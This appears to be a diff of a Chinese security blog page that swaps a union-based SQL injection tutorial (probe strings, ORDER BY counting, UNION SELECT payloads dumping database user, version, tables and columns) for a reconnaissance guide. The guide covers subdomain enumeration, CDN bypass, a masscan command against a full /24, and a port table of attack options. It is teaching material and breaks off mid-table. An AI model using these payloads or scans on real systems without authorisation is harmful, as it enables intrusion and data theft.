@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（三）SQL注入—联合注入原理, Wkai">
+    <meta name="keywords" content="渗透测试—信息收集, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（三）SQL注入—联合注入原理 | Wkai</title>
+    <title>渗透测试—信息收集 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(12).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（三）SQL注入—联合注入原理</h1>
+                    <h1 class="description center-align post-title">渗透测试—信息收集</h1>
                 </div>
             </div>
         </div>
@@ -321,9 +321,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                                <span class="chip bg-color">信息收集</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -331,8 +335,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                SQL注入
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -344,7 +348,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-17
+                    2020-08-14
                 </div>
                 
 
@@ -360,103 +364,337 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li>本篇主要总结了下联合注入的原理，并且结合数据库证明这些原理，联合注入主要是靠union实现，union的功能是将右边的查询结果和左边的查询结果合并，所以大部分操作都是通过union实现的。</li>
-<li>首先列出测试用的表结构和数据</li>
-</ul>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(6).png" alt="数据库test的所有表"></p>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(5).png" alt="表test2"></p>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(7).png" alt="表test3"></p>
-<ul>
-<li>在参数后添加引号，尝试语法错误回显，并用and 1=1#或者and 1=1#测试报错</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#        页面返回正常</span>
-?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">#        页面返回不正常</span>
+                <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这两天被分配了个信息收集的任务，本以为挺简单的，其实步骤还挺多,所以还是总结下比较稳妥</p>
+<br>
 
-这里<span class="token comment" spellcheck="true">#的意思是注释掉结尾的引号</span>
-因为注入后的语句可能是 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>' 这结尾最后的引号是会报错的
-但是如果加了<span class="token comment" spellcheck="true">#，后面的引号就会被注释掉，变成：</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">#'</span>
+<br>
 
-同样的注释方法还可以用<span class="token comment" spellcheck="true">--代替#，不同的数据库有不同的注释字符：</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--'</span></code></pre>
-<ul>
-<li>利用<strong>order by</strong>猜测字段的数量：<strong>order by后面加字段名或者列号，可以让查询结果以次字段排序</strong></li>
-</ul>
-<pre><code>?id=1%27%20order%0aby%0c2%23    --返回正常
---上边用%0a和%0c的URL编码可以代替空格，到数据库后就是空格的意思
+<h4 id="第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站"><a href="#第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站" class="headerlink" title="第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站"></a>第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站</h4><p>1.官方网站，收集子公司的名称可以通过度娘，天眼查，企查查</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(12).png" alt></p>
+<p>2.网站备案看有哪些主域名（或者改后缀可能也有其它域名）</p>
+<p>&emsp;查看网站备案的工具有</p>
+<p>&emsp;&emsp;站长工具查询网站备案，<a href="http://icp.chinaz.com/" target="_blank" rel="noopener">http://icp.chinaz.com/</a></p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(10).png" alt></p>
+<br>
 
-?id=1%27 order by 3#            --返回正常
-?id=1%27 order by 4#            --返回正常
-?id=1%27 order by 5#            --返回错误
---这就证明字段总数为4，不存在第五列
+<br>
 
-在order by后面加入数字，可以代替字段名
-比如order by column1 就可以用 order by 1代替</code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(2).png" alt="用存在的列号排序后去查询"></p>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(1).png" alt="用不存在的列号4去查询"></p>
-<ul>
-<li>利用UNION联合查询，可以判断显示位置</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">#</span>
+<h4 id="第二步，收集子域名"><a href="#第二步，收集子域名" class="headerlink" title="第二步，收集子域名"></a>第二步，收集子域名</h4><p>1.GOOGLE搜索</p>
+<p>&emsp;格式是<code>site:example.com -www</code>，还有许多搜索方法，不过需要多学习些语法</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(5).png" alt></p>
+<p>2.Dnsdb，<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a></p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(4).png" alt></p>
+<p>3.其他类似的在线工具</p>
+<p>&emsp;<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a> </p>
+<p>&emsp;<a href="https://rapiddns.io/subdomain" target="_blank" rel="noopener">https://rapiddns.io/subdomain</a></p>
+<p>4.子域名爆破工具</p>
+<p>&emsp;Sublist3r</p>
+<p>&emsp;OneForAll</p>
+<p>5.使用FOFA直接搜索host=”xxx.com”</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(8).png" alt></p>
+<br>
 
-id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> 查询了一个不存在的列，返回结果为一个空值
-<span class="token keyword">union</span> 右边查询的结果将会和左边的查询结果合并，重复的将会只显示一行
-<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> 直接返回一行值，内容为<span class="token number">1</span>，<span class="token number">2</span>，<span class="token number">3</span></code></pre>
-<ul>
-<li>假如SQL语句查询了所有字段，但是页面只是调用了其中几个字段的值</li>
-</ul>
-<pre><code>SELECT * FROM test2 where id=-1 UNION select 1,2,3;</code></pre><ul>
-<li><p>这个时候，我们就可以在UNION的右边插入想测试的值，比如1，2，3，假如页面中只显示了1和3，说明1和3的位置是能显示的，可以调用类似database()的函数</p>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard.png" alt></p>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(9).png" alt="将3换成database()，将会插入数据库名"></p>
-</li>
-<li><p>利用联合查询输出数据库信息</p>
-</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>CONCAT_WS<span class="token punctuation">(</span>CHAR<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<br>
 
-<span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">--获取数据库用户名</span>
-<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--获取数据库名</span>
-version<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--获取数据库版本信息</span>
+<h4 id="第三步，测试收集到的所有域名是否使用了CDN"><a href="#第三步，测试收集到的所有域名是否使用了CDN" class="headerlink" title="第三步，测试收集到的所有域名是否使用了CDN"></a>第三步，测试收集到的所有域名是否使用了CDN</h4><p>用多Ping去查看响应的IP,看看目标有没有使用CDN</p>
+<p>&emsp;<a href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a> （有时候不稳）</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(1).png" alt></p>
+<p>&emsp;<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a> （推荐使用）</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(9).png" alt></p>
+<p>&emsp;如果返回的IP重复挺多的，那应该就是目标的真实IP,可尝试通过IP去访问目标，如果访问不了，可以通过IP地址反查域名确认，<a href="https://tools.ipip.net/ipdomain.php" target="_blank" rel="noopener">https://tools.ipip.net/ipdomain.php</a></p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(6).png" alt></p>
+<br>
 
-concat_ws<span class="token punctuation">(</span>separator<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--含有分隔符地连接字符串 </span>
-<span class="token comment" spellcheck="true">--里边这的separator分隔符，用 char() 函数把 空格:空格 的ASCII码输出</span>
+<br>
 
-<span class="token comment" spellcheck="true">--其它信息</span>
-@<span class="token variable">@datadir</span>                <span class="token comment" spellcheck="true">--数据库路径</span>
-@<span class="token variable">@version_compile_os</span>    <span class="token comment" spellcheck="true">--操作系统版本</span>
+<h4 id="第四步，绕过CDN"><a href="#第四步，绕过CDN" class="headerlink" title="第四步，绕过CDN"></a>第四步，绕过CDN</h4><p>1.通过注册查看邮件原文（有些网站有通过邮件找回密码的功能，或者注册邮箱认证）</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(14).png" alt></p>
+<p>&emsp;原文里的IP地址</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(3).png" alt></p>
+<p>2.将网址或者IP放到网络空间搜索FOFA里，有概率可以直接拿到网站的IP，可以看到网站用了什么容器，服务器是啥系统，甚至还能看开放了啥端口（FOFA：title=”公司名”等特征 ）</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(7).png" alt></p>
+<p>3.通过查找到的子域名，辅助查找真实IP（有些网站子域名没有配置CDN）</p>
+<p>4.使用国外节点Ping</p>
+<p>&emsp;<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></p>
+<p>5.配置不当</p>
+<p>&emsp;可访问探针phpinfo</p>
+<p>&emsp;站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p>
+<br>
 
-</code></pre>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png" alt="查询到的用户名，数据库名，mysql版本"></p>
-<ul>
-<li>利用联合查询查询数据库test的所有表名</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'test'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">#</span>
+<br>
 
-<span class="token comment" spellcheck="true">--information_schema.tables 从数据库information_schema中查询表tables，tables中存取了所有的表，并且这些表都有对应的数据库名，其中存储表名的字段名为table_name，存储</span>
-数据库名的字段名为table_schema
-<span class="token comment" spellcheck="true">--table_schema=数据库名16进制或者用单引号括起来</span>
-<span class="token comment" spellcheck="true">--limit 0,1 查询结果中从第0个数据开始只读取一个数据</span></code></pre>
-<ul>
-<li><p>不断地改变limit的第一个参数，就能爆出所有的表</p>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(4).png" alt></p>
-</li>
-<li><p>查询表test2的字段</p>
-</li>
-</ul>
-<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'test'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'test2'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">#</span>
+<h4 id="第五步，探测旁站和C段"><a href="#第五步，探测旁站和C段" class="headerlink" title="第五步，探测旁站和C段"></a>第五步，探测旁站和C段</h4><p>旁站：旁站是和目标网站在同一台服务器上的其它的网站</p>
+<p>&emsp;在线查询，<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(13).png" alt></p>
+<p>&emsp;使用FOFA直接搜索IP或者（title=”xxx” &amp;&amp; host=”xxx.com”）</p>
+<br>
 
-<span class="token comment" spellcheck="true">--information_schema.columns 从数据库information_schema中查询表columns，查询条件为数据库名table_schema和表名table_name，查询的值为字段名column_name</span>
-表<span class="token keyword">columns</span>中记录了所有的字段名
-<span class="token comment" spellcheck="true">--limit 0,1 查询结果中从第0个数据开始只读取一个数据</span></code></pre>
-<p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(8).png" alt></p>
-<ul>
-<li>爆出表test3的所有字段值</li>
-</ul>
-<pre><code>union select 1,2,group_concat(sex) from test3;
---用字段名sex从表中取数据
-group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(10).png" alt="字段sex的所有值，默认用逗号分割了"></p>
+<p>C段：C段是和目标服务器ip处在同一个C段的其它服务器</p>
+<p>&emsp;1.使用北极熊扫描器或者Nmap探测同网段主机，尝试存活主机</p>
+<p>&emsp;2.使用FOFA直接搜索IP或者（title=”xxx” &amp;&amp; host=”xxx.com”）</p>
+<p>&emsp;3.ASN码查询C段（大型企业才有）</p>
+<p>&emsp;&emsp;先查询IP的ASN，<a href="https://tools.ipip.net/as.php" target="_blank" rel="noopener">https://tools.ipip.net/as.php</a><br>&emsp;&emsp;然后根据ASN查询目标拥有的资产，<a href="https://www.cidr-report.org/cgi-bin/as-report?as=ASN码" target="_blank" rel="noopener">https://www.cidr-report.org/cgi-bin/as-report?as=ASN码</a></p>
+<br>
 
+<br>
+
+<h4 id="第六步，通过已知资产，在SRC漏洞库中搜索信息"><a href="#第六步，通过已知资产，在SRC漏洞库中搜索信息" class="headerlink" title="第六步，通过已知资产，在SRC漏洞库中搜索信息"></a>第六步，通过已知资产，在SRC漏洞库中搜索信息</h4><p>拿到子域的一些资产可以查找已公开漏洞，例如搜索 某某服VPN<br>&emsp;乌云镜像：<a href="https://wooyun.x10sec.org/" target="_blank" rel="noopener">https://wooyun.x10sec.org/</a></p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard.png" alt></p>
+<br>
+
+<br>
+
+<h4 id="第七步，查找Web指纹（网站架构）"><a href="#第七步，查找Web指纹（网站架构）" class="headerlink" title="第七步，查找Web指纹（网站架构）"></a>第七步，查找Web指纹（网站架构）</h4><p>查找CMS框架、OS、脚本语言、中间件容器 （使用的版本是否存在历史漏洞）</p>
+<p>相关工具</p>
+<p>&emsp;1.wappalyzer（一款chrom插件）</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(2).png" alt></p>
+<p>&emsp;2.云悉指纹（需要邀请码注册）<br>&emsp;3.whatweb</p>
+<p><img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(11).png" alt></p>
+<br>
+
+<br>
+
+<h4 id="第八步，扫描网站开放端口"><a href="#第八步，扫描网站开放端口" class="headerlink" title="第八步，扫描网站开放端口"></a>第八步，扫描网站开放端口</h4><p>在收集了许多域名和IP后，用<code>masscan</code>扫一扫目标的端口，可以多写些高危端口，减小扫描范围，提高效率</p>
+<pre><code>sudo masscan -p 端口 --rate 速率    #只扫相关性高点的几个
+sudo masscan -p 端口 139.224.94.0/24 --rate 1000000    #全C段扫描</code></pre><br>
+
+<p>一些风险端口</p>
+<table>
+<thead>
+<tr>
+<th>tcp 20,21</th>
+<th>FTP（文件传输协议）</th>
+<th>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>tcp 22</td>
+<td>SSH （安全外壳协议 ）</td>
+<td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td>
+</tr>
+<tr>
+<td>tcp 23</td>
+<td>Telnet （ 远程终端协议）</td>
+<td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td>
+</tr>
+<tr>
+<td>tcp 25</td>
+<td>SMTP（简单邮件传输协议）</td>
+<td>邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
+</tr>
+<tr>
+<td>tcp/udp 53</td>
+<td>DNS（域名系统）</td>
+<td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
+</tr>
+<tr>
+<td>tcp/udp 69</td>
+<td>TFTP （简单文件传送协议 ）</td>
+<td>尝试下载目标及其的各类重要配置文件</td>
+</tr>
+<tr>
+<td>tcp 80-89,443,8440-8450,8080-8089</td>
+<td>各种常用的Web服务端口</td>
+<td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td>
+</tr>
+<tr>
+<td>tcp 110</td>
+<td>POP3（邮局协议版本3 ）</td>
+<td>可尝试爆破,嗅探</td>
+</tr>
+<tr>
+<td>tcp 111,2049</td>
+<td>NFS（网络文件系统）</td>
+<td>权限配置不当</td>
+</tr>
+<tr>
+<td>tcp 137,139,445</td>
+<td>SMB（NETBIOS协议）</td>
+<td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
+</tr>
+<tr>
+<td>tcp 143</td>
+<td>IMAP（邮件访问协议）</td>
+<td>可尝试爆破</td>
+</tr>
+<tr>
+<td>udp 161</td>
+<td>SNMP（简单网络管理协议）</td>
+<td>爆破默认团队字符串,搜集目标内网信息</td>
+</tr>
+<tr>
+<td>tcp 389</td>
+<td>LDAP（ 轻量目录访问协议 ）</td>
+<td>ldap注入,允许匿名访问,弱口令</td>
+</tr>
+<tr>
+<td>tcp 512,513,514</td>
+<td>Linux rexec （远程登录）</td>
+<td>可爆破,rlogin登陆</td>
+</tr>
+<tr>
+<td>tcp 873</td>
+<td>Rsync （数据镜像备份工具）</td>
+<td>匿名访问,文件上传</td>
+</tr>
+<tr>
+<td>tcp 1194</td>
+<td>OpenVPN（虚拟专用通道）</td>
+<td>想办法钓VPN账号,进内网</td>
+</tr>
+<tr>
+<td>tcp 1352</td>
+<td>Lotus（Lotus软件）</td>
+<td>弱口令,信息泄漏,爆破</td>
+</tr>
+<tr>
+<td>tcp 1433</td>
+<td>SQL Server（数据库管理系统）</td>
+<td>注入,提权,sa弱口令,爆破</td>
+</tr>
+<tr>
+<td>tcp 1521</td>
+<td>Oracle（甲骨文数据库）</td>
+<td>tns爆破,注入,弹shell…</td>
+</tr>
+<tr>
+<td>tcp 1500</td>
+<td>ISPmanager（ 主机控制面板）</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 1723</td>
+<td>PPTP（点对点隧道协议 ）</td>
+<td>爆破,想办法钓VPN账号,进内网</td>
+</tr>
+<tr>
+<td>tcp 2082,2083</td>
+<td>cPanel （虚拟机控制系统 ）</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 2181</td>
+<td>ZooKeeper（分布式系统的可靠协调系统 ）</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>tcp 2601,2604</td>
+<td>Zebra （zebra路由）</td>
+<td>默认密码zerbra</td>
+</tr>
+<tr>
+<td>tcp 3128</td>
+<td>Squid （代理缓存服务器）</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 3312,3311</td>
+<td>kangle（web服务器）</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 3306</td>
+<td>MySQL（数据库）</td>
+<td>注入,提权,爆破</td>
+</tr>
+<tr>
+<td>tcp 3389</td>
+<td>Windows rdp（桌面协议）</td>
+<td>shift后门[需要03以下的系统],爆破,ms12-020</td>
+</tr>
+<tr>
+<td>tcp 3690</td>
+<td>SVN（开放源代码的版本控制系统）</td>
+<td>svn泄露,未授权访问</td>
+</tr>
+<tr>
+<td>tcp 4848</td>
+<td>GlassFish（应用服务器）</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 5000</td>
+<td>Sybase/DB2（数据库）</td>
+<td>爆破,注入</td>
+</tr>
+<tr>
+<td>tcp 5432</td>
+<td>PostgreSQL（数据库）</td>
+<td>爆破,注入,弱口令</td>
+</tr>
+<tr>
+<td>tcp 5900,5901,5902</td>
+<td>VNC（虚拟网络控制台，远控）</td>
+<td>弱口令爆破</td>
+</tr>
+<tr>
+<td>tcp 5984</td>
+<td>CouchDB（数据库）</td>
+<td>未授权导致的任意指令执行</td>
+</tr>
+<tr>
+<td>tcp 6379</td>
+<td>Redis（数据库）</td>
+<td>可尝试未授权访问,弱口令爆破</td>
+</tr>
+<tr>
+<td>tcp 7001,7002</td>
+<td>WebLogic（WEB应用系统）</td>
+<td>Java反序列化,弱口令</td>
+</tr>
+<tr>
+<td>tcp 7778</td>
+<td>Kloxo（虚拟主机管理系统）</td>
+<td>主机面板登录</td>
+</tr>
+<tr>
+<td>tcp 8000</td>
+<td>Ajenti（Linux服务器管理面板）</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 8443</td>
+<td>Plesk（虚拟主机管理面板）</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 8069</td>
+<td>Zabbix （系统网络监视）</td>
+<td>远程执行,SQL注入</td>
+</tr>
+<tr>
+<td>tcp 8080-8089</td>
+<td>Jenkins,JBoss （应用服务器）</td>
+<td>反序列化,控制台弱口令</td>
+</tr>
+<tr>
+<td>tcp 9080-9081,9090</td>
+<td>WebSphere（应用服务器）</td>
+<td>Java反序列化/弱口令</td>
+</tr>
+<tr>
+<td>tcp 9200,9300</td>
+<td>ElasticSearch （Lucene的搜索服务器）</td>
+<td>远程执行</td>
+</tr>
+<tr>
+<td>tcp 11211</td>
+<td>Memcached（缓存系统）</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>tcp 27017,27018</td>
